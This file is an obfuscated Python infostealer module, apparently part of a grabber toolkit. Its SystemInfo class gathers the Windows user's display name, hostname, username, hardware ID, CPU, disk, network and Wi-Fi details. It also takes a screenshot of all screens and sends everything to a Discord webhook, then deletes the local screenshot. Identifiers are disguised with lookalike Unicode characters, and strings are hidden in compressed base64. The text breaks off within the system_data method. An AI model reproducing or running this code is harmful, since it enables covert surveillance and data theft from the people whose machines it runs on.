import ctypes
import os
import re
import subprocess
import uuid
import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time

class SystemInfo:

    def __init__(self, webhook):
        𝘄𝗲𝘣𝘩𝗼𝗼𝗸 = 𝗦𝘺𝘯𝗰𝙒𝙚𝗯𝘩𝙤𝗼𝙠.from_url(𝙬𝘦𝙗𝗵𝙤𝗼𝙠)
        𝗲𝙢𝘣𝘦𝗱 = 𝗘𝘮𝗯𝙚𝙙(title=__𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x0b5\xce\xa9Jq\x0f+\xf1t\xcd)\x8d\xca\xb5\xacL\nw3H\x0c\xb7,\x05\x00j\x0f\x08a')).decode(), color=𝘪𝘯𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 395 - (𝘪𝙣𝙩(𝗢) + 𝗶), 𝗺𝘢𝗽(__𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝙩𝘦𝘳(__𝘪𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝗲(0)), __𝗶𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝘦𝙢𝗯𝘦𝗱.add_field(name=𝘴𝘦𝘭𝙛.user_data()[𝗶𝘯𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 979 - (𝘪𝙣𝘁(𝙊) + 𝗶), 𝘮𝗮𝗽(__𝙞𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘁𝗲𝙧(__𝙞𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝙞𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝗲𝘭𝙛.user_data()[𝗶𝙣𝘁.from_bytes(𝗺𝙖𝗽(lambda O, i: 966 - (𝘪𝘯𝘵(𝙊) + 𝙞), 𝘮𝗮𝘱(__𝘪𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝗶𝙩𝗲𝘳(__𝗶𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\x894\x04\x00\x03\x1f\x01.')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝗲(1)), __𝘪𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝘦𝙡𝘧.user_data()[𝙞𝙣𝘵.from_bytes(𝗺𝘢𝙥(lambda O, i: 878 - (𝗶𝙣𝘵(𝙊) + 𝙞), 𝙢𝘢𝙥(__𝗶𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝙞𝘁𝘦𝗿(__𝘪𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3wI6\x02\x00\x03\x04\x01)')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝘦(1)), __𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝘮𝘣𝙚𝘥.add_field(name=𝘴𝗲𝘭𝙛.system_data()[𝙞𝙣𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 421 - (𝘪𝗻𝘵(𝗢) + 𝗶), 𝗺𝘢𝘱(__𝗶𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝘵𝗲𝘳(__𝘪𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝘨𝘦(0)), __𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝘦𝙡𝘧.system_data()[𝙞𝘯𝙩.from_bytes(𝙢𝗮𝙥(lambda O, i: 453 - (𝙞𝘯𝙩(𝙊) + 𝙞), 𝗺𝗮𝙥(__𝘪𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝙩𝘦𝘳(__𝘪𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3s\t\xad\x04\x00\x03+\x01a')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝙚(1)), __𝗶𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝗲𝗹𝙛.system_data()[𝙞𝗻𝘁.from_bytes(𝗺𝙖𝘱(lambda O, i: 933 - (𝙞𝙣𝘵(𝘖) + 𝘪), 𝘮𝘢𝙥(__𝙞𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝗶𝘵𝙚𝘳(__𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xf1\xad\x00\x00\x03N\x01i')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝙚(1)), __𝘪𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗲𝗺𝙗𝙚𝘥.add_field(name=𝙨𝙚𝘭𝙛.disk_data()[𝗶𝗻𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 341 - (𝗶𝗻𝙩(𝗢) + 𝙞), 𝘮𝘢𝘱(__𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝙩𝙚𝗿(__𝙞𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝘦(0)), __𝗶𝙢𝙥𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝗲𝙡𝗳.disk_data()[𝘪𝗻𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 991 - (𝙞𝙣𝙩(𝗢) + 𝗶), 𝘮𝗮𝙥(__𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝘵𝙚𝙧(__𝘪𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\xc9.\x07\x00\x03\x89\x01\x86')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝗲(1)), __𝗶𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝗲𝗹𝙛.disk_data()[𝗶𝗻𝙩.from_bytes(𝗺𝗮𝙥(lambda O, i: 612 - (𝗶𝗻𝘁(𝙊) + 𝙞), 𝙢𝘢𝙥(__𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘁𝙚𝙧(__𝘪𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcbr-\x07\x00\x03{\x01u')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(1)), __𝙞𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙚𝗺𝘣𝙚𝙙.add_field(name=𝘴𝙚𝗹𝘧.network_data()[𝙞𝙣𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 779 - (𝙞𝙣𝙩(𝗢) + 𝙞), 𝘮𝘢𝗽(__𝗶𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝙩𝘦𝘳(__𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝗲(0)), __𝗶𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝙚𝗹𝙛.network_data()[𝘪𝙣𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 807 - (𝘪𝙣𝘵(𝗢) + 𝘪), 𝙢𝗮𝘱(__𝙞𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝙚𝗿(__𝘪𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3wq4\x02\x00\x02\xc0\x01\x07')).decode())] * 3)), 𝙧𝘢𝗻𝙜𝙚(1)), __𝗶𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝙚𝗹𝙛.network_data()[𝘪𝙣𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 739 - (𝙞𝘯𝙩(𝘖) + 𝗶), 𝘮𝗮𝗽(__𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝙩𝙚𝘳(__𝘪𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xab\xf25\x06\x00\x03w\x01I')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝙚(1)), __𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙚𝘮𝙗𝙚𝗱.add_field(name=𝘀𝙚𝙡𝘧.wifi_data()[𝘪𝙣𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 314 - (𝘪𝘯𝘵(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝘁𝗲𝙧(__𝗶𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝗻𝗴𝗲(0)), __𝙞𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘀𝙚𝗹𝘧.wifi_data()[𝗶𝙣𝙩.from_bytes(𝙢𝗮𝙥(lambda O, i: 900 - (𝘪𝗻𝘁(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝘪𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝘁𝙚𝘳(__𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3w\xc96\x05\x00\x03\x17\x014')).decode())] * 3)), 𝗿𝘢𝘯𝙜𝗲(1)), __𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝙨𝙚𝗹𝗳.wifi_data()[𝙞𝙣𝘁.from_bytes(𝘮𝙖𝗽(lambda O, i: 349 - (𝗶𝙣𝙩(𝙊) + 𝘪), 𝗺𝙖𝙥(__𝗶𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝙞𝘁𝘦𝗿(__𝙞𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xad\n4\x06\x00\x03{\x01L')).decode())] * 3)), 𝙧𝘢𝙣𝗴𝘦(1)), __𝙞𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗶𝗺𝗮𝗴𝗲 = 𝘐𝙢𝗮𝘨𝘦𝘎𝗿𝗮𝘣.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
        𝗶𝙢𝙖𝗴𝙚.save(__𝘪𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())
        𝗲𝙢𝗯𝘦𝗱.set_image(url=__𝗶𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8b\x8c\x082\x88\x0c\xf7\xcbO\n\x0f+Mq\xc9/\xf31\xf6\xcbJ\xce\r\xcbI\xca\x03\x8a\x19\x07\x96&\xbb\x9b\xe6\x01\x00\xe9\n\x0c\xb0')).decode())
        try:
            𝙬𝙚𝗯𝙝𝗼𝗼𝗸.send(embed=𝗲𝗺𝗯𝗲𝙙, file=𝙁𝙞𝘭𝙚(__𝙞𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xc9\xa9\xa8\x8a4\xf6\xca\x89\n7\xadJt\xb74\xf0\xc9s*\x8d*\xb7\xb5\x05\x00hj\x08\x1a')).decode(), filename=__𝗶𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()), username=__𝙞𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a0\x03\xe6')).decode(), avatar_url=__𝗶𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,\xf0\xc9\xcd)\x892\x0e\xab\xf4\xc9\xf5+K\n\xb6\xf4L\xcc+\xc8M\xcc\x8d\n\xf6\xc9s*\x8d*\xb7\xb5\x05\x00Q\xda\x0fT')).decode())
        except:
            pass
        if 𝗼𝙨.path.exists(__𝘪𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()):
            𝙤𝘴.remove(__𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())

    def user_data(self):

        def display_name():
            𝘎𝘦𝘁𝘜𝙨𝙚𝙧𝘕𝙖𝗺𝙚𝘌𝘅 = 𝗰𝘵𝘺𝘱𝙚𝙨.windll.secur32.GetUserNameExW
            𝙉𝙖𝗺𝗲𝘿𝘪𝙨𝘱𝙡𝗮𝘺 = 𝗶𝗻𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 578 - (𝙞𝗻𝘁(𝙊) + 𝘪), 𝗺𝘢𝗽(__𝘪𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝙚𝘳(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0bI6\x04\x00\x03/\x017')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝗲(1)), __𝘪𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)
            𝙨𝙞𝙯𝘦 = 𝗰𝘁𝘺𝙥𝘦𝙨.pointer(𝗰𝘵𝘆𝘱𝙚𝙨.c_ulong(𝙞𝘯𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 583 - (𝗶𝙣𝘵(𝙊) + 𝘪), 𝗺𝘢𝘱(__𝙞𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝙩𝗲𝗿(__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝙣𝙜𝗲(0)), __𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)))
            𝙂𝗲𝘵𝘜𝙨𝘦𝘳𝗡𝙖𝙢𝘦𝗘𝙭(𝘕𝗮𝗺𝘦𝗗𝗶𝘴𝘱𝙡𝘢𝙮, None, 𝘴𝘪𝙯𝙚)
            𝘯𝘢𝘮𝘦𝘽𝘂𝙛𝙛𝙚𝙧 = 𝗰𝘁𝘆𝗽𝙚𝘴.create_unicode_buffer(𝙨𝘪𝙯𝗲.contents.value)
            𝙂𝗲𝘵𝙐𝘀𝘦𝗿𝙉𝗮𝘮𝙚𝗘𝙭(𝙉𝗮𝘮𝘦𝘋𝙞𝘀𝘱𝘭𝘢𝘆, 𝘯𝘢𝙢𝙚𝘽𝘶𝗳𝙛𝘦𝘳, 𝘀𝘪𝙯𝘦)
            return 𝗻𝗮𝘮𝘦𝘉𝙪𝘧𝙛𝙚𝗿.value
        𝙙𝗶𝙨𝘱𝗹𝗮𝙮_𝘯𝙖𝘮𝗲 = 𝙙𝙞𝘴𝘱𝙡𝙖𝘆_𝘯𝘢𝗺𝗲()
        𝙝𝗼𝘴𝙩𝘯𝘢𝗺𝗲 = 𝗼𝘴.getenv(__𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b"x\xda\x0b4\xb0\xf4\x0bu\x0b\x0b\r\n\xf3\xf2\x0f\x0c5t\x03\x00'w\x04\xad")).decode())
        𝘂𝘴𝗲𝙧𝘯𝙖𝗺𝙚 = 𝘰𝘴.getenv(__𝘪𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x0b\x0b\xf3s\x0b\xcd6u\n\t\r\xb5\x05\x00\x18\x9b\x03\xb3')).decode())
        return (__𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcf\xf52L6\x0eJK\x0c7MK6\xca)Nt\xb74\x8c\x8a\x082\x88\n\xc9O\x0f\x8b\xf0\xcbIN\xb7\xb5\x05\x00\xd7\xba\x0b\xc3')).decode(), __𝙞𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0fr\xcf\xa9Jv\xaf\xc8H\rv\xf2\x8f\x0c7\xcc\xf1\xcft2O\x0b,\xf0L2\xf63H\xcau+\x89\n\xc9OO56\xf0\x0e\x8b\xf0\xcbI\xce5\xcdH\n\x0f5\xf3\xf4(\xb1\x8c\x04\xea\x05\x00\xbfK\x15]')).decode().format(𝗱𝘪𝙨𝙥𝘭𝗮𝘆_𝙣𝙖𝗺𝘦, 𝗵𝙤𝘀𝘵𝘯𝘢𝙢𝙚, 𝘂𝘴𝗲𝗿𝙣𝙖𝗺𝗲), False)

    def system_data(self):

        def get_hwid():
            try:
                𝗵𝘸𝘪𝗱 = 𝘀𝙪𝘣𝗽𝘳𝘰𝘤𝗲𝙨𝙨.check_output(__𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xac*H\x0e3\xca)\x8dr\xb74N6\xac\x08I\x8d\xf03\x88\n7\xa8\xf2\xcd\xa90\x8e\xcc\r+\x89pK\xf1\x0b\x0e\xf5-\x8d\x8a\xc8\xc8\xf1t\xf7\xabJ\xf6\xf0*\x8b\xf2\x08\xcbJqv\xca\x8b\x8a\x08LO\x89\x08+\x88r\xb4\xb5\x05\x00\x89\xca\x18\xbc')).decode(), shell=True, stdin=𝙨𝙪𝗯𝘱𝙧𝘰𝗰𝘦𝘴𝘀.PIPE, stderr=𝙨𝘂𝘣𝘱𝘳𝙤𝗰𝙚𝘀𝙨.PIPE).decode(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝗶𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())[𝗶𝘯𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 664 - (𝘪𝘯𝘁(𝙊) + 𝗶), 𝙢𝗮𝙥(__𝘪𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘵𝗲𝙧(__𝗶𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcb\x8a\xac\x02\x00\x03\xa6\x01\x8c')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(1)), __𝘪𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].strip()
            except:
                𝗵𝘸𝘪𝘥 = __𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0b\xc9\xb5,\x8d\n\xb4\xb5\x05\x00\x0cT\x02\x95')).decode()
            return 𝙝𝘄𝙞𝘥
        𝙘𝘱𝘂 = 𝘸𝗺𝙞.WMI().Win32_Processor()[𝘪𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 563 - (𝗶𝗻𝘵(𝘖) + 𝗶), 𝙢𝙖𝗽(__𝗶𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝘪𝘁𝙚𝙧(__𝘪𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝗲(0)), __𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
